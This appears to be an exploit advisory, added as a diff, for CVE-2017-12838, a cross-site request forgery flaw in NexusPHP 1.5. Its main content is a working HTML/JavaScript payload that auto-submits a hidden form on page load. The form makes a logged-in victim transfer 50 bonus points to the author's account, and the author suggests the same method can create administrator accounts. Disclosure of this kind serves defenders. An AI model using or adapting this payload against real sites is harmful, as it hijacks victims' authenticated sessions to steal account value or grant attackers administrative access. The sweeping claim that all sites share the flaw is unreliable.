@@ -1,0 +1,78 @@
+###########################
+# Powered by C0d3r1iu     #
+# Team:HIT-nslab          #
+# mail:admin@recorday.cn  #
+# CVE-2017-12838          #
+###########################
+
+===============================================
+infomation:
+
+The server doesn't confirm the POST request origin like HTTP header Referers infomation.
+
+we can use tools like BurpSuite catch the data and delete the Referers and repeat to check this.
+
+So,we can do cross site request forgery
+
+Source:the code doesn't confirm the POST request origin,it led some dangerous request like add administrators account can 
+
+be forgery.
+
+Affected software: NexusPHP 1.5
+
+
+Software Link: http://sourceforge.net/projects/nexusphp/
+
+	Free to modify and redistribute this program.
+	Use at your own risk and you are responsible for what you are doing.
+
+
+===============================================
+exploit:
+
+The program allows user send the score which called "mana","mana" can improve your user level and do something special.
+
+so we can do cross site request forgery to let users send me manas.
+
+We can construct the form arbitrarily, use javascript to realize automatic submission,  when the user is in login site 
+
+status (cookie perennial can log on) and open our web page,the request will automatically launch.
+
+payload for example:   
+
+
+
+<html>
+<body>
+<script type="text/javascript">
+function post(url,fields)
+{
+var p =document.createElement("form");
+    p.action= url;
+	p.method="POST";
+	p.target="_self";
+	p.innerHTML = fields;
+	document.body.appendChild(p);
+	p.submit();
+}
+function attack()
+{
+var fields;
+	fields += "<input type='text' name='option' value='7'>";
+	fields += "<input type='text' name='username' value='PinkFloyd2'>";   //my account is PinkFloyd2
+	fields += "<input type='text' name='bonusgift' value='50'>"; 
+	fields += "<input type='text' name='message' value='hello'>"; 
+var url="http://localhost/mybonus.php?action=exchange";
+	post(url,fields);
+}
+window.onload = function() { attack();}
+</script>
+</body>
+</html>
+
+
+
+when user view this page,he will send 50 "mana" to my account,and all website has this problem,so we can add administrators 
+account if we want
+
+	
